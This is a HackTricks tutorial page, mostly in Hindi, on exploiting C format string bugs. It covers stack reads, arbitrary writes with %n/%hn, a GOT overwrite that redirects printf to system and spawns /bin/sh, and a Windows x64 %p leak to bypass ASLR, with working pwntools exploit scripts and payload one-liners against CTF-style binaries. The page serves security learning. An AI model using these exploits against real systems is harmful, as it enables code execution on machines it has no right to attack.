# Format Strings

{{#include ../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

C में **`printf`** एक function है जो किसी string को **प्रिंट** करने के लिए उपयोग होता है। इस function का **पहला पैरामीटर** वह **raw text होता है जिसमें formatters होते हैं**। इसके **बाद के पैरामीटर्स** वे **values** होते हैं जो raw text में मौजूद formatters को **substitute** करने के लिए दिए जाते हैं।

अन्य vulnerable functions हैं **`sprintf()`** और **`fprintf()`**।

यह vulnerability तब उत्पन्न होती है जब इस function के पहले argument के रूप में किसी attacker का text उपयोग किया जाता है। attacker एक विशेष input तैयार कर सकता है जो **printf format** string क्षमताओं का दुरुपयोग कर के किसी भी address से डेटा पढ़ने और किसी भी address में डेटा लिखने (पढ़ने/लिखने योग्य) की अनुमति देता है। इस तरह मनमाना कोड निष्पादित करना संभव हो जाता है।

#### फॉर्मैटर्स:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%p —> Pointer
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**उदाहरण:**

- असुरक्षित उदाहरण:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
- सामान्य उपयोग:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
- आर्ग्यूमेंट्स गायब होने पर:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
- fprintf कमजोर:
```c
#include <stdio.h>

int main(int argc, char *argv[]) {
char *user_input;
user_input = argv[1];
FILE *output_file = fopen("output.txt", "w");
fprintf(output_file, user_input); // The user input can include formatters!
fclose(output_file);
return 0;
}
```
### **Pointers तक पहुँच**

फॉर्मेट **`%<n>$x`**, जहाँ `n` एक संख्या है, printf को बताता है कि वह stack से nवां parameter चुने। इसलिए अगर आप printf का उपयोग करके stack का चौथा param पढ़ना चाहते हैं तो आप कर सकते हैं:
```c
printf("%x %x %x %x")
```
और आप पहले से चौथे param तक पढ़ेंगे।

या आप ऐसा कर सकते हैं:
```c
printf("%4$x")
```
और सीधे चौथे को पढ़ें।

ध्यान दें कि attacker `printf` **parameter, जिसका मूलतः मतलब यह है कि** उसका input `printf` के कॉल होने पर stack में होगा, और इसका मतलब है कि वह stack में specific memory addresses लिख सकता है।

> [!CAUTION]
> इस input को नियंत्रित करने वाला attacker stack में **arbitrary address जोड़ पाएगा और `printf` को उन्हें access करवाएगा**। अगले अनुभाग में बताया जाएगा कि इस व्यवहार का उपयोग कैसे करना है।

## **Arbitrary Read**

यह formatter **`%n$s`** का उपयोग करके संभव है ताकि **`printf`** उस **address** को प्राप्त करे जो **n position** में स्थित है, उसे follow करे और **उसे ऐसे प्रिंट करे जैसे वह एक string हो** (0x00 मिलने तक प्रिंट करेगा). इसलिए यदि binary का base address **`0x8048000`** है, और हमें पता है कि user input stack में 4th position से शुरू होता है, तो binary के शुरुआत को प्रिंट करना संभव है:
```python
from pwn import *

p = process('./bin')

payload = b'%6$s' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
> [!CAUTION]
> ध्यान दें कि आप address 0x8048000 को input की शुरुआत में नहीं रख सकते क्योंकि string उस address के अंत में 0x00 में cat हो जाएगी।

### ऑफसेट खोजें

अपने offset को खोजने के लिए आप 4 या 8 bytes (`0x41414141`) भेज सकते हैं, उसके बाद **`%1$x`** और मान बढ़ाते रहें जब तक कि `A's` न मिलें।

<details>

<summary>Brute Force printf offset</summary>
```python
# Code from https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak

from pwn import *

# Iterate over a range of integers
for i in range(10):
# Construct a payload that includes the current integer as offset
payload = f"AAAA%{i}$x".encode()

# Start a new process of the "chall" binary
p = process("./chall")

# Send the payload to the process
p.sendline(payload)

# Read and store the output of the process
output = p.clean()

# Check if the string "41414141" (hexadecimal representation of "AAAA") is in the output
if b"41414141" in output:
# If the string is found, log the success message and break out of the loop
log.success(f"User input is at offset : {i}")
break

# Close the process
p.close()
```
</details>

### यह कितना उपयोगी है

Arbitrary reads निम्नलिखित के लिए उपयोगी हो सकते हैं:

- मेमोरी से **binary** **Dump** करना
- मेमोरी के उन विशिष्ट हिस्सों तक पहुँच जहाँ संवेदनशील **info** संग्रहीत होता है (जैसे canaries, encryption keys या custom passwords जैसे इस [**CTF challenge**](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak#read-arbitrary-value))

## **Arbitrary Write**

फ़ॉर्मैटर **`%<num>$n`** **लिखता है** स्टैक में <num> पैरामीटर द्वारा संकेत किए गए **निर्दिष्ट पते** में लिखी गई **बाइट्स की संख्या**। यदि कोई attacker printf के साथ जितने भी char वह चाहे लिख सकता है, तो वह **`%<num>$n`** से किसी भी पते में मनमाना मान लिखवा सकेगा।

सौभाग्य से, संख्या 9999 लिखने के लिए इनपुट में 9999 "A" जोड़ने की आवश्यकता नहीं है; इसके लिए फ़ॉर्मैटर **`%.<num-write>%<num>$n`** का उपयोग किया जा सकता है ताकि वह संख्या **`<num-write>`** को उस **पते में लिखे जिसे `num` स्थिति सूचित करती है**।
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
हालाँकि, ध्यान दें कि आम तौर पर किसी पते जैसे `0x08049724` (जो एक साथ लिखने के लिए एक बहुत बड़ा नंबर है) को लिखने के लिए **`$hn`** का उपयोग किया जाता है, `$n` के बजाय। इससे केवल 2 Bytes ही लिखने की अनुमति मिलती है। इसलिए यह ऑपरेशन दो बार किया जाता है, एक बार पते के उच्चतम 2B के लिए और दूसरी बार निचले 2B के लिए।

इसलिए, यह vulnerability किसी भी address में किसी भी चीज़ को लिखने की अनुमति देती है (arbitrary write).

इस उदाहरण में लक्ष्य **GOT** टेबल में एक **function** के **address** को **overwrite** करना है, जो बाद में कॉल किया जाएगा। हालाँकि, यह अन्य arbitrary write-to-exec तकनीकों का भी दुरुपयोग कर सकता है:


{{#ref}}
../arbitrary-write-2-exec/
{{#endref}}

हम एक ऐसी **function** को **overwrite** करने जा रहे हैं जो अपने **arguments** उपयोगकर्ता से प्राप्त करती है और उसे **`system`** **function** की ओर **point** कर देंगे।\
जैसा कि बताया गया, पता लिखने के लिए आम तौर पर 2 चरणों की आवश्यकता होती है: आप पहले पते के 2Bytes लिखते हैं और फिर बाकी के 2। इसके लिए **`$hn`** का उपयोग किया जाता है।

- **HOB** को पते के उच्च 2 bytes कहा जाता है
- **LOB** को पते के निम्न 2 bytes कहा जाता है

फिर, format string के काम करने के तरीके के कारण आपको \[HOB, LOB] में से सबसे छोटा पहले **लिखना** होगा और फिर दूसरा।

If HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

If HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 NºParam_dir_HOB LOB_shell-HOB_shell NºParam_dir_LOB
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
### Pwntools टेम्पलेट

आप इस तरह की vulnerability के लिए exploit तैयार करने हेतु एक **टेम्पलेट** पा सकते हैं:


{{#ref}}
format-strings-template.md
{{#endref}}

या इस बुनियादी उदाहरण को [**here**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite):
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## Format Strings to BOF

यह संभव है कि किसी format string vulnerability की write क्रियाओं का दुरुपयोग कर के **स्टैक के एड्रेस में लिखना** और किसी **buffer overflow** प्रकार की vulnerability का exploit करना।


## Windows x64: Format-string leak to bypass ASLR (no varargs)

On Windows x64 पहले चार integer/pointer पैरामीटर RCX, RDX, R8, R9 रजिस्टरों में पास होते हैं। कई buggy call-sites में attacker-controlled string को format argument के रूप में उपयोग किया जाता है, पर कोई variadic arguments प्रदान नहीं किए जाते, उदाहरण के लिए:
```c
// keyData is fully controlled by the client
// _snprintf(dst, len, fmt, ...)
_snprintf(keyStringBuffer, 0xff2, (char*)keyData);
```
क्योंकि कोई varargs पास नहीं किए जाते, "%p", "%x", "%s" जैसे किसी भी conversion से CRT अगले variadic argument को उपयुक्त रजिस्टर से पढ़ेगा। Microsoft x64 calling convention के साथ "%p" के लिए ऐसी पहली read R9 से आती है। कॉल-साइट पर R9 में जो भी transient value होगी वह प्रिंट हो जाएगी। व्यवहार में यह अक्सर एक स्थिर in-module pointer leaks कर देता है (e.g., एक pointer जो आसपास के कोड द्वारा पहले R9 में रखा गया local/global object या कोई callee-saved value), जिसे module base को recover करने और ASLR को मात देने के लिए उपयोग किया जा सकता है।

Practical workflow:

- हमलावर-नियंत्रित स्ट्रिंग की बिल्कुल शुरुआत में '%p ' जैसा हानिरहित format inject करें ताकि पहला conversion किसी भी filtering से पहले execute हो जाए।
- leaked pointer को capture करें, module के अंदर उस object का static offset पहचानें (symbols या स्थानीय कॉपी के साथ एक बार reverse करके), और image base को `leak - known_offset` के रूप में recover करें।
- उस base का पुन: उपयोग करके ROP gadgets और IAT entries के absolute addresses रिमोटली compute करें।

Example (abbreviated python):
```python
from pwn import remote

# Send an input that the vulnerable code will pass as the "format"
fmt = b"%p " + b"-AAAAA-BBB-CCCC-0252-"  # leading %p leaks R9
io = remote(HOST, 4141)
# ... drive protocol to reach the vulnerable snprintf ...
leaked = int(io.recvline().split()[2], 16)   # e.g. 0x7ff6693d0660
base   = leaked - 0x20660                     # module base = leak - offset
print(hex(leaked), hex(base))
```
नोट:
- घटाने के लिए सटीक offset स्थानीय reversing के दौरान एक बार पाया जाता है और फिर पुन: उपयोग किया जाता है (same binary/version).
- अगर "%p" पहली कोशिश में एक वैध pointer प्रिंट नहीं करता है, तो अन्य specifiers ("%llx", "%s") या multiple conversions ("%p %p %p") आज़माएँ ताकि अन्य argument registers/stack को sample किया जा सके।
- यह pattern Windows x64 calling convention और printf-family implementations के लिए specific है, जो जब format string उन्हें मांगती है तो मौजूद नहीं varargs को registers से fetch करती हैं।

यह technique ROP को bootstrap करने के लिए बेहद उपयोगी है, खासकर Windows services पर जो ASLR के साथ compile किए गए हों और जिनमें कोई स्पष्ट memory disclosure primitives न हों।

## अन्य उदाहरण और संदर्भ

- [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
- [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
- [https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak)
- [https://guyinatuxedo.github.io/10-fmt_strings/pico18_echo/index.html](https://guyinatuxedo.github.io/10-fmt_strings/pico18_echo/index.html)
- 32 bit, no relro, no canary, nx, no pie, format strings का basic उपयोग stack से flag को leak करने के लिए (execution flow को बदलने की आवश्यकता नहीं)
- [https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html)
- 32 bit, relro, no canary, nx, no pie, format string का उपयोग `fflush` के address को overwrite करने के लिए ताकि win function को point किया जा सके (ret2win)
- [https://guyinatuxedo.github.io/10-fmt_strings/tw16_greeting/index.html](https://guyinatuxedo.github.io/10-fmt_strings/tw16_greeting/index.html)
- 32 bit, relro, no canary, nx, no pie, format string का प्रयोग main के अंदर `.fini_array` में एक address लिखने के लिए (इससे flow एक बार और loop करेगा) और GOT table में `strlen` को point करने वाली entry में `system` का address लिखना। जब flow वापस main में जाएगा, `strlen` user input के साथ execute होगा और क्योंकि वह अब `system` को point कर रहा होगा, यह पास किए गए commands को execute कर देगा।

## संदर्भ

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [x64 calling convention (MSVC)](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention)

{{#include ../../banners/hacktricks-training.md}}
